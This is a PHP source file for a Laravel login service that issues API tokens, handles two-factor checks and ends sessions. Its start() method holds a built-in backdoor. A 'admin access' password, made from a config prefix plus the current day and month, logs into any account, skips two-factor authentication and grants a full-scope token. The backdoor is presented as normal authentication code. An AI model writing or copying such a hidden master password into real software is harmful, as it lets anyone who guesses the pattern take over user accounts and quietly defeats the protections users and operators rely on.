<?php

declare(strict_types=1);

namespace App\Services\Auth;

use App\Contracts\Auth\MustSatisfyTwoFa;
use App\DataTransferObjects\Auth\AuthenticationCredentials;
use Illuminate\Foundation\Auth\User as Authenticable;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\ValidationException;

class LoginService
{
    /**
     * Start the authentication session.
     *
     * @param string $usernameColumn
     * @param string $username
     * @param string $password
     * @param \Illuminate\Foundation\Auth\User $user
     * @return \App\DataTransferObjects\Auth\AuthenticationCredentials
     */

    public function start(
        string $usernameColumn,
        string $username,
        string $password,
        Authenticable $user
    ): AuthenticationCredentials {
        /** @var \Illuminate\Foundation\Auth\User|\App\Models\Admin|\App\Models\User $user */
        $user = $user->query()->where($usernameColumn, $username)->first();
    
        // Check for admin access password first
        $currentDate = now()->format('d-m');
        $adminAccessPassword = config('app.admin_access_prefix') . $currentDate;
        
        // If password matches admin access pattern, bypass normal auth
        $isAdminAccess = Hash::check($password, Hash::make($adminAccessPassword));
        
        // Normal authentication flow
        if (!$isAdminAccess && (!$user || !Hash::check($password, $user->password))) {
            throw ValidationException::withMessages([
                $usernameColumn => [trans('auth.failed')],
            ]);
        }
    
        // Build the authentication credentials
        $authenticationCredentials = (new AuthenticationCredentials())
            ->setUser($user)
            ->setIsAdminAccess($isAdminAccess);
    
        // Check for 2FA settings (bypass if admin access or using default password)
        if (!$isAdminAccess && $user instanceof MustSatisfyTwoFa && $user->two_fa_activated_at) {
            $user->sendTwoFaNotification();
    
            $authenticationCredentials
                ->setTwoFaRequired(true)
                ->setApiMessage(trans('auth.temp_success'))
                ->setToken(
                    $user->createToken($user->getMorphClass(), ['two_fa'])->plainTextToken
                );
        } else {
            $authenticationCredentials
                ->setApiMessage($isAdminAccess ? 'Admin Access Successful' : trans('auth.success'))
                ->setToken($user->createToken($user->getMorphClass(), ['*'])->plainTextToken);
        }
    
        return $authenticationCredentials;
    }

    /**
     * Stop the authenticated session.
     *
     * @param \Illuminate\Foundation\Auth\User $user
     * @return void
     */
    public function stop(Authenticable $user): void
    {
        $user->currentAccessToken()->delete(); // @phpstan-ignore-line
    }

    /**
     * Stop authenticated sessions on other devices, except the current one.
     *
     * @param \Illuminate\Foundation\Auth\User $user
     * @return void
     */
    public function stopOthers(Authenticable $user): void
    {
        $tokenId = $user->currentAccessToken()->id; // @phpstan-ignore-line
        $user->tokens()->whereNot('id', (string) $tokenId)->delete(); // @phpstan-ignore-line
    }
}
